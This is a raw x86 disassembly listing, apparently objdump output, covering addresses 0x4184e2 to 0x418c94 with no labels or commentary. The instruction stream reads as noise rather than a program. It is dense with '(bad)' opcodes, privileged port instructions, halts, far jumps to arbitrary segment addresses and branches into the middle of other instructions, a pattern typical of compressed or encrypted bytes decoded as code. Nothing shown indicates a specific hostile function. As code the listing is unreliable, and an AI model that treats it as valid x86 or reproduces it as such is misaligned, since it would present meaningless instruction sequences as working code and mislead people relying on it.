  4184e2:	fdiv   DWORD PTR [ecx-0x5440cc1e]
  4184e8:	pop    ebx
  4184ea:	jmp    0x4184e0
  4184ec:	pop    eax
  4184ed:	scas   eax,DWORD PTR es:[edi]
  4184ee:	mov    ebp,0x10334104
  4184f3:	pop    ecx
  4184f4:	imul   ebx,DWORD PTR [ecx],0x19
  4184f7:	cmp    al,bl
  4184f9:	mov    cl,0x73
  4184fb:	jae    0x4184ac
  4184fd:	shl    BYTE PTR [esi],1
  4184ff:	xchg   edi,eax
  418500:	repnz adc BYTE PTR [ebp+0x5e9477e7],bh
  418507:	adc    eax,0xa420f091
  41850c:	push   ss
  41850d:	pop    esi
  41850e:	jmp    DWORD PTR [ebx]
  418510:	mov    bh,0xaa
  418512:	sub    ebx,ecx
  418514:	gs xchg esi,eax
  418516:	mov    ss,WORD PTR [ebp+0x3a]
  418519:	mov    bl,0xd0
  41851b:	mov    bl,0x5a
  41851d:	cs adc al,0xea
  418520:	lods   al,BYTE PTR ds:[esi]
  418521:	jp     0x418546
  418523:	outs   dx,BYTE PTR ds:[esi]
  418524:	inc    esp
  418525:	mov    esi,DWORD PTR [esi+edi*4-0x56]
  418529:	hlt    
  41852a:	mov    edx,esp
  41852c:	mov    ebp,0x9cb79439
  418531:	imul   ecx,DWORD PTR [eax+eiz*1],0xebb63fd6
  418538:	mov    al,ds:0x90124440
  41853d:	nop
  41853e:	ret    0x55ca
  418541:	push   ecx
  418542:	pop    edi
  418543:	call   0xa9b7:0xe3189e6c
  41854a:	jge    0x418575
  41854c:	sub    al,dl
  41854e:	mov    dh,0x9a
  418550:	inc    ebx
  418551:	jge    0x418576
  418553:	ins    DWORD PTR es:[edi],dx
  418554:	ret    
  418555:	loopne 0x4184e7
  418557:	sahf   
  418558:	pop    ds
  418559:	pop    es
  41855a:	inc    edi
  41855b:	retf   
  41855c:	mov    esp,0xd04f366
  418561:	outs   dx,DWORD PTR ds:[esi]
  418562:	mov    ah,0x5c
  418564:	cld    
  418565:	jmp    0xe066:0x5f6f6fe8
  41856c:	xor    esi,DWORD PTR [edx]
  41856e:	fwait
  41856f:	jge    0x4185ec
  418571:	outs   dx,BYTE PTR ds:[esi]
  418572:	and    DWORD PTR [ecx-0x58],ebx
  418575:	or     DWORD PTR [edx],esi
  418577:	lods   eax,DWORD PTR ds:[esi]
  418578:	mov    dl,0x8b
  41857a:	inc    esp
  41857b:	sub    ebx,DWORD PTR [edx+ebp*4]
  41857e:	(bad)  
  41857f:	push   ds
  418580:	or     edi,DWORD PTR [ebp+ebx*4+0x11]
  418584:	add    eax,0x7bd2ff91
  418589:	out    0x43,al
  41858b:	or     eax,0xb0502473
  418590:	inc    eax
  418591:	inc    ebp
  418592:	push   edx
  418593:	pop    DWORD PTR [eax]
  418595:	retf   
  418596:	jb     0x418521
  418598:	js     0x4185ee
  41859a:	add    BYTE PTR [esp+ecx*4+0x3c],0xac
  41859f:	mov    fs,WORD PTR [eax+0x781f0ebd]
  4185a5:	fcmovnbe st,st(3)
  4185a7:	leave  
  4185a8:	cmp    ah,dh
  4185aa:	mov    ebp,0x289d253e
  4185af:	aaa    
  4185b0:	or     al,0xaf
  4185b2:	addr16 aaa 
  4185b4:	shl    DWORD PTR [esi],cl
  4185b6:	fimul  WORD PTR [esi-0x70]
  4185b9:	push   esp
  4185ba:	xchg   dh,dh
  4185bc:	and    DWORD PTR [eax],ebp
  4185be:	stos   BYTE PTR es:[edi],al
  4185bf:	mov    ds:0x29f9d732,eax
  4185c4:	cwde   
  4185c5:	xchg   ebp,eax
  4185c6:	data16 jg 0x4185e2
  4185c9:	sahf   
  4185ca:	mov    ds:0xe3f13a33,eax
  4185cf:	int3   
  4185d0:	popf   
  4185d1:	mov    WORD PTR [ebx+0x2a7baba8],?
  4185d7:	scas   al,BYTE PTR es:[edi]
  4185d8:	dec    ecx
  4185d9:	xchg   eax,ebp
  4185db:	es push ss
  4185dd:	aas    
  4185de:	pop    esi
  4185df:	ins    BYTE PTR es:[edi],dx
  4185e0:	jle    0x41858a
  4185e2:	jle    0x418613
  4185e4:	loop   0x4185be
  4185e6:	ret    
  4185e7:	push   es
  4185e8:	jmp    0x5086:0x54e594a7
  4185ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f0:	jne    0x418587
  4185f2:	jle    0x418625
  4185f4:	inc    eax
  4185f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f7:	cmp    eax,0x2b1dc66e
  4185fc:	ja     0x418624
  4185fe:	repz add esp,edi
  418601:	fwait
  418602:	dec    ebx
  418603:	mov    ebp,0x6f2274f4
  418608:	push   ss
  418609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41860a:	jmp    0x418660
  41860c:	sbb    al,0x6
  41860e:	jp     0x418653
  418610:	mov    bh,0xee
  418612:	aad    0x2f
  418614:	out    dx,eax
  418615:	inc    ebx
  418616:	mov    eax,ds:0xef724f64
  41861b:	jle    0x4185d6
  41861d:	cli    
  41861e:	in     eax,0x9
  418620:	mov    edi,0xf2a6bd1d
  418625:	or     DWORD PTR [esi],edx
  418627:	rol    BYTE PTR [ecx-0x45cfe982],0xd9
  41862e:	mov    bh,0xb6
  418630:	sub    eax,0x21ed801e
  418635:	fidivr DWORD PTR [edi+eax*8]
  418638:	pop    ds
  418639:	xchg   ebx,ecx
  41863b:	mov    WORD PTR ds:0x1d0fa28e,ss
  418641:	cmp    eax,0x7f4116ef
  418646:	into   
  418647:	scas   al,BYTE PTR es:[edi]
  418648:	xchg   edi,eax
  418649:	cwde   
  41864a:	jmp    0xc076:0x830001d8
  418651:	shr    DWORD PTR [esi-0x72],1
  418654:	(bad)  
  418655:	ins    DWORD PTR es:[edi],dx
  418656:	sub    ebp,DWORD PTR [edx]
  418658:	mov    edi,0x48968d53
  41865d:	pop    edx
  41865e:	lods   eax,DWORD PTR ds:[esi]
  41865f:	arpl   bx,sp
  418661:	call   0x14253d03
  418666:	dec    esp
  418667:	pusha  
  418668:	sub    ch,BYTE PTR ds:0x9a4cff27
  41866e:	and    DWORD PTR [ecx-0x5ed4fc22],ecx
  418674:	adc    al,bh
  418676:	sbb    ecx,DWORD PTR [ebx-0x6046a4d6]
  41867c:	lods   al,BYTE PTR ds:[esi]
  41867d:	push   0x48d51b3a
  418682:	fwait
  418683:	stc    
  418684:	std    
  418685:	test   eax,0xbff33020
  41868a:	sub    ecx,ecx
  41868c:	scas   al,BYTE PTR es:[edi]
  41868d:	mov    BYTE PTR [ebx-0x1fe9d487],ch
  418693:	mov    eax,0x3be8d0c
  418698:	ss mov ecx,0x599f6b4a
  41869e:	(bad)  
  41869f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186a0:	sub    ecx,edx
  4186a2:	ret    0x8531
  4186a5:	jnp    0x418673
  4186a7:	add    al,0x4c
  4186a9:	push   esp
  4186aa:	shl    BYTE PTR [ebx-0x52704d13],1
  4186b0:	loop   0x418638
  4186b2:	(bad)  
  4186b3:	in     eax,0x62
  4186b5:	add    BYTE PTR [ecx],ah
  4186b7:	jns    0x418658
  4186b9:	mov    eax,ds:0x4a31fd57
  4186be:	aad    0x75
  4186c0:	and    esi,DWORD PTR [esi+ebp*4]
  4186c3:	xor    al,0xec
  4186c5:	retf   0xfadb
  4186c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186c9:	mov    WORD PTR [esi],cs
  4186cb:	fist   WORD PTR [ecx+0x636cea66]
  4186d1:	repnz cdq 
  4186d3:	imul   ebx,DWORD PTR [edx+0xc71f387],0x87d29b3a
  4186dd:	repnz dec esp
  4186df:	mov    DWORD PTR ss:[ebp+0x3d03cd94],edi
  4186e6:	mov    ds:0xa39a807,eax
  4186eb:	sti    
  4186ec:	inc    esi
  4186ed:	int3   
  4186ee:	iret   
  4186ef:	xchg   edi,eax
  4186f0:	lods   eax,DWORD PTR ds:[esi]
  4186f1:	xor    al,0xcf
  4186f3:	mov    ds:0xa92b555,eax
  4186f8:	jnp    0x4186ce
  4186fa:	jne    0x4186a1
  4186fc:	popf   
  4186fd:	add    eax,0xfe96773
  418702:	mov    al,0x1
  418704:	or     al,0xee
  418706:	sbb    DWORD PTR [ebp+ecx*1+0x22],esp
  41870a:	pushf  
  41870b:	imul   ecx,esp,0x15
  41870e:	xlat   BYTE PTR ds:[ebx]
  41870f:	shl    DWORD PTR [eax+ebx*2],1
  418712:	add    al,0x6
  418714:	pop    edx
  418715:	jecxz  0x418729
  418717:	cwde   
  418718:	jecxz  0x4186e3
  41871a:	fiadd  DWORD PTR [edx]
  41871c:	jl     0x418721
  41871e:	addr16 xchg ecx,eax
  418720:	out    0xc8,eax
  418722:	(bad)  [edi-0x15]
  418725:	mov    esp,0xe1353924
  41872a:	lea    ebp,[eax-0x16]
  41872d:	push   esp
  41872e:	popf   
  41872f:	dec    ebp
  418730:	mov    eax,ds:0xcb53db8
  418735:	iret   
  418736:	add    BYTE PTR [ebp-0x63],bh
  418739:	xchg   edi,eax
  41873a:	gs (bad) 
  41873f:	add    esi,ecx
  418741:	lock sub BYTE PTR [eax+0x73],ch
  418745:	sti    
  418746:	mov    ebp,0x7452f2e8
  41874b:	jo     0x41879d
  41874d:	and    al,0xb
  41874f:	lock mov dl,0x0
  418752:	mov    cl,0xe4
  418754:	push   0xffffffc5
  418756:	xchg   esi,eax
  418757:	pop    ds
  418758:	cmp    al,0xf6
  41875a:	std    
  41875b:	imul   esp,DWORD PTR [edi+ecx*1+0x66],0x3b23b3a9
  418763:	sub    eax,0x87e24fb
  418768:	rcl    DWORD PTR [ecx],1
  41876a:	and    dl,BYTE PTR [edx-0x6]
  41876d:	xor    ebp,edx
  41876f:	scas   eax,DWORD PTR es:[edi]
  418770:	and    ch,BYTE PTR [eax+0x213ce90f]
  418776:	addr16 fs push cs
  418779:	xor    eax,0x2f9fe3c0
  41877e:	add    ch,BYTE PTR [eax-0x4a]
  418781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418782:	or     al,0x2a
  418784:	fwait
  418785:	out    dx,al
  418786:	cs out 0xe8,al
  418789:	or     al,0x49
  41878b:	in     al,0xd5
  41878d:	xchg   ecx,eax
  41878e:	pop    edx
  41878f:	hlt    
  418790:	push   edi
  418791:	pop    edx
  418792:	hlt    
  418793:	clc    
  418794:	or     DWORD PTR [ecx-0x17],eax
  418797:	xchg   edi,eax
  418798:	push   0x958c35f4
  41879d:	xor    al,0xf1
  41879f:	xor    ah,cl
  4187a1:	mov    ah,0x10
  4187a3:	jecxz  0x41880d
  4187a5:	mov    ds:0xf8d354f4,al
  4187aa:	adc    ch,BYTE PTR [eax-0x9]
  4187ad:	sbb    ebx,DWORD PTR [edi-0x31]
  4187b0:	in     al,0xca
  4187b2:	push   es
  4187b3:	out    0x16,eax
  4187b5:	jmp    0x822a:0x6dbb9960
  4187bc:	pop    ebx
  4187bd:	mov    ecx,0x39308bb2
  4187c2:	xchg   edi,eax
  4187c3:	cmc    
  4187c4:	sbb    BYTE PTR ds:[esi],al
  4187c7:	mov    bh,0xaf
  4187c9:	sbb    DWORD PTR [esi+esi*2-0x6c],edx
  4187cd:	bound  esp,QWORD PTR [eax+0x188c268a]
  4187d3:	mov    bl,0x72
  4187d5:	mov    eax,es
  4187d7:	and    dh,BYTE PTR [ecx]
  4187d9:	setge  BYTE PTR [edx]
  4187dc:	pop    es
  4187dd:	jg     0x4187fe
  4187df:	mov    ch,0x56
  4187e1:	mov    ecx,0x732649b0
  4187e6:	in     al,0x76
  4187e8:	and    cl,BYTE PTR [ecx+0x60]
  4187eb:	or     dl,cl
  4187ed:	das    
  4187ee:	push   ds
  4187ef:	pusha  
  4187f0:	inc    edx
  4187f1:	inc    esp
  4187f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f3:	pop    ds
  4187f4:	mov    BYTE PTR es:[ebp-0x2626b6c0],al
  4187fb:	call   0x268ddbc9
  418800:	inc    edx
  418801:	or     eax,0xaa612263
  418806:	inc    edi
  418807:	adc    al,0x75
  418809:	inc    ebp
  41880a:	out    0xe3,eax
  41880c:	lods   al,BYTE PTR ds:[esi]
  41880d:	mov    bh,0xbc
  41880f:	shr    cl,cl
  418811:	cmp    al,0xe0
  418813:	rcl    edi,0xe5
  418816:	or     dl,BYTE PTR [edx+0x71]
  418819:	xchg   edi,eax
  41881a:	test   BYTE PTR [ebp-0x18],ah
  41881d:	jmp    0x4187f6
  41881f:	or     edx,DWORD PTR [edx+0x2b]
  418822:	stos   DWORD PTR es:[edi],eax
  418823:	or     eax,0x5d9c1b73
  418828:	sbb    eax,0x36c79b73
  41882d:	jns    0x41880c
  41882f:	shl    BYTE PTR [eax-0x1deeb8d6],0xe3
  418836:	or     al,0xed
  418838:	out    0xda,eax
  41883a:	sbb    dh,dl
  41883c:	sbb    edx,eax
  41883e:	call   0x1460:0x429883c4
  418845:	pop    esp
  418846:	sti    
  418847:	in     al,dx
  418848:	mov    ebp,0xc04a0cef
  41884d:	sub    BYTE PTR [ecx*1-0x3aa47313],0x9a
  418855:	push   ss
  418856:	jg     0x41880d
  418858:	adc    eax,0x27bb15ac
  41885d:	mov    bh,0x2c
  41885f:	pop    edi
  418860:	adc    esi,DWORD PTR [eax+0x3c]
  418863:	mov    ecx,DWORD PTR [esi-0x43]
  418866:	ins    BYTE PTR es:[edi],dx
  418867:	(bad)  
  418868:	dec    eax
  418869:	jns    0x4187fa
  41886b:	loope  0x418835
  41886d:	loopne 0x418885
  41886f:	mov    dh,0xb6
  418871:	and    BYTE PTR [eax-0x201bb8fb],bh
  418877:	daa    
  418878:	adc    esi,DWORD PTR [ecx+eax*8-0x17]
  41887c:	test   BYTE PTR ds:0xfe140e49,0x16
  418883:	and    eax,0xd60344f6
  418888:	add    eax,0x279a7ced
  41888d:	fdiv   DWORD PTR [eax]
  41888f:	sar    ah,1
  418891:	repnz mov esp,0x432c1774
  418897:	xchg   edx,eax
  418898:	(bad)
  41889b:	out    0xbf,al
  41889d:	pop    edx
  41889e:	dec    edi
  41889f:	xchg   bh,bl
  4188a1:	push   cs
  4188a2:	cdq    
  4188a3:	repz and edi,DWORD PTR [edi-0x460e8b0]
  4188aa:	js     0x4188ff
  4188ac:	jno    0x418876
  4188ae:	adc    eax,0xf3a47012
  4188b3:	jmp    FWORD PTR [edx-0x241afce2]
  4188b9:	int3   
  4188ba:	dec    ebp
  4188bb:	sbb    ebp,DWORD PTR [edx]
  4188bd:	loope  0x4188e1
  4188bf:	je     0x418876
  4188c1:	mov    cs,WORD PTR [esi]
  4188c3:	rcr    DWORD PTR [eax],1
  4188c5:	out    dx,eax
  4188c6:	fdiv   QWORD PTR gs:[edx-0x38]
  4188ca:	adc    BYTE PTR ds:0x68210a13,al
  4188d0:	xor    eax,0xdf957469
  4188d5:	icebp  
  4188d6:	hlt    
  4188d7:	lods   al,BYTE PTR ds:[esi]
  4188d8:	sub    BYTE PTR [esi],ah
  4188da:	out    0xec,eax
  4188dc:	mov    al,0x7f
  4188de:	pop    ecx
  4188df:	aad    0xa3
  4188e1:	jbe    0x4188f1
  4188e3:	and    ebp,DWORD PTR [ecx]
  4188e5:	xor    dh,BYTE PTR [esi]
  4188e7:	call   0x2ca3cd47
  4188ec:	aam    0xff
  4188ee:	xchg   ebx,eax
  4188ef:	popa   
  4188f0:	mov    cl,0x97
  4188f2:	ins    DWORD PTR es:[edi],dx
  4188f3:	loope  0x418878
  4188f5:	add    DWORD PTR [ebp+0x3],esp
  4188f8:	and    al,0x71
  4188fa:	and    edx,DWORD PTR [ebx-0x2c]
  4188fd:	xchg   esi,eax
  4188fe:	xor    ebx,esp
  418900:	inc    BYTE PTR [ecx]
  418902:	clc    
  418903:	mov    cl,0x3f
  418905:	and    BYTE PTR [edi-0x39acb809],ah
  41890b:	xor    bl,BYTE PTR fs:[esi-0x41]
  41890f:	jbe    0x418943
  418911:	jno    0x4188f0
  418913:	dec    esp
  418914:	push   ecx
  418915:	in     eax,dx
  418916:	fisub  WORD PTR ds:0xa2367c9a
  41891c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41891d:	imul   bx,WORD PTR [ecx+0x4c28d99],0x12
  418925:	or     DWORD PTR [ebp+0x29],ebp
  418928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418929:	jne    0x4188dd
  41892b:	and    al,0xd8
  41892d:	mov    esi,ebx
  41892f:	outs   dx,BYTE PTR ds:[esi]
  418930:	pop    ebp
  418931:	dec    ebx
  418932:	test   DWORD PTR es:[esp+ecx*8-0x72],0x47f9913f
  41893b:	pop    ebp
  41893c:	add    al,0x51
  41893e:	cmp    al,0x57
  418940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418941:	(bad)  
  418942:	(bad)  
  418943:	ret    
  418944:	push   edi
  418945:	sub    DWORD PTR [edi+0x52],ebp
  418948:	mov    BYTE PTR [esi],0x17
  41894b:	popf   
  41894c:	jmp    0x3721:0xf690765f
  418953:	mov    al,ds:0x838615fd
  418958:	aaa    
  418959:	sub    BYTE PTR [ebx+0x5625d282],0xaf
  418960:	out    dx,eax
  418961:	test   eax,0xf0d2ed7b
  418966:	addr16 mov esi,0xdcd271f3
  41896c:	mov    cl,0xbb
  41896e:	outs   dx,BYTE PTR ds:[esi]
  41896f:	cwde   
  418970:	retf   
  418971:	mov    ah,0xd2
  418973:	push   ebx
  418974:	xlat   BYTE PTR ds:[ebx]
  418975:	dec    edi
  418976:	sub    al,0xb0
  418978:	xchg   ebp,eax
  418979:	sub    ch,ch
  41897b:	daa    
  41897c:	xor    cl,dh
  41897e:	jbe    0x4189f5
  418980:	dec    edx
  418981:	adc    edi,DWORD PTR [edx]
  418983:	ds jmp 0xbd07ce55
  418989:	add    DWORD PTR [edx+0x8dfdc93],ecx
  41898f:	push   esi
  418990:	icebp  
  418991:	xchg   edi,eax
  418992:	mov    ah,BYTE PTR [ebp+0x4d866dd1]
  418998:	clc    
  418999:	sub    BYTE PTR [ecx+edx*8],ch
  41899c:	shl    cl,1
  41899e:	mov    BYTE PTR [edx+0x5],dh
  4189a1:	addr16 sub esi,esi
  4189a4:	je     0x418a11
  4189a6:	pop    ebx
  4189a7:	cmp    eax,0x3ae96345
  4189ac:	ficomp DWORD PTR [ecx+esi*1+0x63]
  4189b0:	popa   
  4189b1:	push   edi
  4189b2:	imul   edx,DWORD PTR [edx+0x2c05501a],0xffffffe1
  4189b9:	lea    eax,[eax+0x49]
  4189bc:	(bad)  
  4189bd:	lods   eax,DWORD PTR ds:[esi]
  4189be:	clc    
  4189bf:	xchg   edi,eax
  4189c0:	lods   eax,DWORD PTR ds:[esi]
  4189c1:	jno    0x4189b5
  4189c3:	rol    DWORD PTR [eax+0x1e50ed40],cl
  4189c9:	es dec ebx
  4189cb:	add    cl,BYTE PTR [edi]
  4189cd:	pop    es
  4189ce:	test   eax,0x6ddfd8e8
  4189d3:	rol    DWORD PTR [ecx+0x702ff978],cl
  4189d9:	rcl    esp,0xeb
  4189dc:	jae    0x418982
  4189de:	push   eax
  4189df:	or     eax,0xb8b094aa
  4189e5:	aaa    
  4189e6:	addr16 jo 0x418982
  4189e9:	and    al,BYTE PTR [eax-0xb]
  4189ec:	fsubr  DWORD PTR [edx-0x3e]
  4189ef:	add    eax,0x3497c23a
  4189f4:	loopne 0x418983
  4189f6:	inc    ecx
  4189f7:	pop    esp
  4189f8:	icebp  
  4189f9:	out    dx,al
  4189fa:	push   ss
  4189fb:	fidiv  DWORD PTR [ebx]
  4189fd:	mov    al,ds:0xa628e6ea
  418a02:	xchg   edx,eax
  418a03:	fnstenv [esi-0x44d206fa]
  418a09:	js     0x418a69
  418a0b:	sub    BYTE PTR [edi],dl
  418a0d:	push   edx
  418a0e:	push   ecx
  418a0f:	in     al,dx
  418a10:	mov    ds:0xba8be794,al
  418a15:	xor    BYTE PTR [ebx+ebp*8-0x55],ah
  418a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1a:	imul   edx,DWORD PTR [esi],0xffffffd0
  418a1d:	xchg   esi,eax
  418a1e:	(bad)  
  418a1f:	fisubr DWORD PTR [eax+0x22]
  418a22:	sbb    dh,BYTE PTR [eax-0xb]
  418a25:	push   0x53
  418a27:	std    
  418a28:	dec    edx
  418a29:	das    
  418a2a:	xchg   ecx,eax
  418a2b:	mov    ebp,DWORD PTR [edi+0x73]
  418a2e:	test   al,0x2a
  418a30:	push   edi
  418a31:	push   ecx
  418a32:	leave  
  418a33:	(bad)
  418a38:	push   esp
  418a39:	into   
  418a3a:	xchg   ecx,eax
  418a3b:	and    ah,dl
  418a3d:	mov    ds:0x99c52c05,al
  418a42:	or     BYTE PTR [ebp+ebp*8-0x40c4aeec],0xc9
  418a4a:	adc    BYTE PTR [edi-0x74],dl
  418a4d:	xor    BYTE PTR [esi+0x79d13827],bh
  418a53:	icebp  
  418a54:	outs   dx,DWORD PTR ds:[esi]
  418a55:	cmp    al,0x92
  418a57:	out    0xe5,al
  418a59:	push   DWORD PTR [edi-0x49]
  418a5c:	int    0xc6
  418a5e:	int3   
  418a5f:	(bad)  
  418a61:	(bad)  
  418a62:	or     al,0x83
  418a64:	mov    ch,0x7a
  418a66:	lahf   
  418a67:	mov    bh,0xb8
  418a69:	mov    ah,0x89
  418a6b:	(bad)  
  418a6c:	loop   0x418ae4
  418a6e:	fdivp  st(4),st
  418a70:	das    
  418a71:	push   esi
  418a72:	call   0x8928:0x66fe4027
  418a79:	cmp    BYTE PTR [ecx+0xe],al
  418a7c:	mov    edx,0x68269e9b
  418a81:	addr16 int 0x34
  418a84:	mov    cl,0xc8
  418a86:	mov    BYTE PTR [ebx-0x10cee1b0],ch
  418a8c:	adc    eax,0xa1621aaa
  418a91:	pop    ebx
  418a92:	pop    esi
  418a93:	outs   dx,DWORD PTR ds:[esi]
  418a94:	mov    ah,ch
  418a96:	std    
  418a97:	adc    DWORD PTR [esi+0x22210904],edi
  418a9d:	sbb    al,0x33
  418a9f:	sub    al,0x3a
  418aa1:	inc    eax
  418aa2:	sub    dh,BYTE PTR [ecx+0x54]
  418aa5:	call   0x5a:0xf57fe6de
  418aac:	mov    bl,0x8
  418aae:	push   ebp
  418aaf:	gs jl  0x418a80
  418ab2:	xor    ch,BYTE PTR ds:[esi]
  418ab5:	xchg   esp,eax
  418ab6:	idiv   DWORD PTR [esi+edi*2-0x239ecf2a]
  418abd:	into   
  418abe:	je     0x418a77
  418ac0:	sub    DWORD PTR [ebp+edx*2-0x49549c79],esi
  418ac7:	mov    edi,0x774209f0
  418acc:	mov    cl,0x1
  418ace:	adc    DWORD PTR [ecx],0xffffffdc
  418ad1:	in     eax,dx
  418ad2:	sar    edx,1
  418ad4:	cmp    al,0x48
  418ad6:	xor    eax,DWORD PTR [esi]
  418ad8:	and    al,BYTE PTR [ebp+0x42a21c6f]
  418ade:	(bad)  
  418adf:	imul   ecx,DWORD PTR [edi-0x7c],0x27
  418ae3:	sub    DWORD PTR [eax-0xc],ecx
  418ae6:	mov    bl,0x5e
  418ae8:	inc    edx
  418ae9:	into   
  418aea:	sahf   
  418aeb:	sub    al,0x5
  418aed:	dec    eax
  418aee:	aaa    
  418aef:	(bad)  
  418af1:	out    dx,al
  418af2:	ins    BYTE PTR es:[edi],dx
  418af3:	sub    cl,BYTE PTR [ebp+0x1d]
  418af6:	call   0x8fbe742b
  418afb:	mov    ebx,DWORD PTR [edx]
  418afd:	xor    ebp,DWORD PTR [eax+eiz*2-0x31]
  418b01:	loopne 0x418b3f
  418b03:	mov    ebp,ss
  418b05:	pop    eax
  418b06:	mov    esi,0x7331df6e
  418b0b:	jae    0x418acc
  418b0d:	div    DWORD PTR [eax+0x3b]
  418b10:	dec    esi
  418b11:	and    edx,eax
  418b13:	aaa    
  418b14:	adc    al,0xd7
  418b16:	das    
  418b17:	mov    al,ds:0x6a12d24b
  418b1c:	mov    al,ds:0xeaa54528
  418b21:	mov    ebx,0x238dff45
  418b26:	or     eax,0x821b8366
  418b2b:	mov    ds,WORD PTR [ecx-0xeea13ee]
  418b31:	sbb    cl,BYTE PTR [ebx]
  418b33:	cmp    al,0x36
  418b35:	or     bh,BYTE PTR [ecx-0x30]
  418b38:	xor    al,0x7
  418b3a:	not    BYTE PTR [eax+0x53ef5152]
  418b40:	add    edx,0xffffffd8
  418b43:	xlat   BYTE PTR ds:[ebx]
  418b44:	mov    ch,0xab
  418b46:	shl    DWORD PTR [eax+0x6c],0x5f
  418b4a:	add    DWORD PTR [edx],esi
  418b4c:	adc    eax,DWORD PTR [ecx-0x28]
  418b4f:	xchg   ebx,eax
  418b50:	mov    esp,0xa8208962
  418b55:	xchg   ebp,ebp
  418b57:	bound  esi,QWORD PTR ds:0x3d76ba15
  418b5d:	nop
  418b5e:	arpl   WORD PTR [ebp+0x4e],bp
  418b61:	loop   0x418b80
  418b63:	pop    ebp
  418b64:	popf   
  418b65:	popa   
  418b66:	jmp    0x418af8
  418b68:	push   edx
  418b69:	ja     0x418b07
  418b6b:	jns    0x418baa
  418b6d:	ins    DWORD PTR es:[edi],dx
  418b6e:	pusha  
  418b6f:	popa   
  418b70:	cmp    DWORD PTR [edx+0x1],ecx
  418b73:	add    edi,DWORD PTR [edx-0x2b30d70]
  418b79:	aad    0x7a
  418b7b:	sbb    DWORD PTR [edi],ecx
  418b7d:	or     al,0xcb
  418b7f:	ss or  eax,0xebbb9118
  418b85:	mov    al,ds:0x64e6b2e2
  418b8a:	test   al,0xf5
  418b8c:	ror    DWORD PTR [edi-0x41],0x99
  418b90:	mov    ?,WORD PTR [edi+0x6f]
  418b93:	call   FWORD PTR [edi]
  418b95:	pop    ecx
  418b96:	jnp    0x418b70
  418b98:	sbb    bl,BYTE PTR [ecx+0x5baae5d9]
  418b9e:	adc    al,0x57
  418ba0:	pop    ebx
  418ba1:	in     eax,0xac
  418ba3:	cmp    eax,0x84318863
  418ba8:	dec    ebx
  418ba9:	xchg   esi,eax
  418baa:	jmp    edi
  418bac:	rcl    DWORD PTR [eax+edx*8-0x36],0x2
  418bb1:	std    
  418bb2:	pop    ss
  418bb3:	xchg   ecx,eax
  418bb4:	outs   dx,BYTE PTR ds:[esi]
  418bb5:	and    al,0xfd
  418bb7:	mov    al,ds:0xbca3e5d1
  418bbc:	(bad)  
  418bbd:	lods   al,BYTE PTR ds:[esi]
  418bbe:	pop    edx
  418bbf:	xor    eax,DWORD PTR [ebx+0x18]
  418bc2:	arpl   WORD PTR [ebx],si
  418bc4:	lds    edi,FWORD PTR [edi]
  418bc6:	frstor [edi+0x47]
  418bc9:	pop    DWORD PTR [ebp+0x5a0a6e08]
  418bcf:	pop    esi
  418bd0:	adc    BYTE PTR [eax+0x4261789a],dl
  418bd6:	sahf   
  418bd7:	cmp    BYTE PTR [eax-0x15],0xa0
  418bdb:	das    
  418bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bdd:	xor    ebp,DWORD PTR [eax+0x6d]
  418be0:	dec    esp
  418be1:	mov    bh,0xd6
  418be3:	mov    ch,0x64
  418be5:	mov    al,ds:0xc8b074f4
  418bea:	retf   0x925
  418bed:	test   eax,0x7bc42b59
  418bf2:	fldcw  WORD PTR [eax-0x65]
  418bf5:	int3   
  418bf6:	fadd   DWORD PTR [ebp+0x0]
  418bf9:	fld    DWORD PTR [ecx]
  418bfb:	mov    ebx,esp
  418bfd:	out    0x3c,al
  418bff:	rcl    BYTE PTR [edx*4-0x332c05ef],1
  418c06:	arpl   bp,dx
  418c08:	mov    ecx,ds
  418c0a:	outs   dx,BYTE PTR ds:[esi]
  418c0b:	fsub   DWORD PTR cs:[edx+0x64]
  418c0f:	jmp    0x70ae5c57
  418c14:	sbb    eax,ebp
  418c16:	jo     0x418c69
  418c18:	icebp  
  418c19:	inc    cl
  418c1b:	not    DWORD PTR [edx]
  418c1d:	call   0xe30afa49
  418c22:	add    eax,0x7f890bba
  418c27:	inc    ecx
  418c28:	mov    BYTE PTR [edx+edx*4],bh
  418c2b:	cmp    ebp,DWORD PTR [esi-0x4e5cfc4f]
  418c31:	sbb    bl,bh
  418c33:	int3   
  418c34:	jge    0x418c52
  418c36:	cmp    al,0x7d
  418c38:	shl    ecx,0x81
  418c3b:	add    edx,DWORD PTR [eax]
  418c3d:	jl     0x418bd6
  418c3f:	fsub   st,st(5)
  418c41:	jae    0x418c3d
  418c43:	pop    eax
  418c44:	jae    0x418cb0
  418c46:	fcomp  DWORD PTR ds:0x42825ad5
  418c4c:	pop    ebx
  418c4d:	add    eax,0xcfc620ef
  418c52:	ret    
  418c53:	xchg   edx,eax
  418c54:	int    0x6e
  418c56:	mov    ebx,es
  418c58:	lahf   
  418c59:	data16 int3 
  418c5b:	xchg   esp,eax
  418c5c:	jne    0x418c6b
  418c5e:	mov    ebp,DWORD PTR [ecx-0x7b]
  418c61:	push   ebp
  418c62:	rcr    DWORD PTR [ecx-0x2a],1
  418c65:	aaa    
  418c66:	sub    eax,0x25e439be
  418c6b:	and    al,0xe0
  418c6d:	movntq (bad),mm0
  418c6e:	out    0xc2,eax
  418c70:	hlt    
  418c71:	sub    bh,BYTE PTR ds:0x1bf0e5
  418c77:	retf   
  418c78:	dec    eax
  418c79:	mov    edx,0x3a334bd7
  418c7e:	push   ecx
  418c7f:	test   BYTE PTR [eax+edi*2],dh
  418c82:	push   ss
  418c83:	cmp    edi,eax
  418c85:	lods   eax,DWORD PTR ds:[esi]
  418c86:	out    dx,al
  418c87:	or     BYTE PTR [ebx+0x7e47a03c],al
  418c8d:	mov    al,ds:0x7f70f144
  418c92:	mov    ch,bh
  418c94:	mov    ebp,0x404a4f82
